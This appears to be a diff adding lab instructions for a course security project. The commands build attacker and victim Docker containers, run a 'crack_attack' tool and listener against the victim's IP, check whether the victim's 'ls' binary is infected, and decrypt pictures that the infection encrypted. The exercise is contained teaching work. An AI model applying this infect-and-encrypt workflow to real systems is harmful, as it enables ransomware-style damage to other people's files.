@@ -1,0 +1,26 @@
+sudo docker build -t csc2024-project3 -f csc2024-project3.Dockerfile .
+
+sudo docker compose -f csc2024-project3-docker-compose.yml up -d
+
+sudo docker exec -it attacker bash
+
+sudo docker exec -it victim bash
+
+on attacker docker
+cd 109550169-109550021
+make
+./attacker_server 8888 &
+./crack_attack 172.18.0.3 172.18.0.2 8888
+
+on victim docker
+(check the ls file whether infected or not)
+xxd ls | tail -n 1
+
+./ls
+
+(use identify to simple_pic is a jpeg or not)
+(if it's not a jpeg means it's encrypted)
+identify ./Pictures/simple_pic.jpg
+
+(Check whether the encrypted files can be decrypted)
+python3 rsa_decrypt.py 22291846172619859445381409012451 14499309299673345844676003563183 ./Pictures/simple_pic.jpg
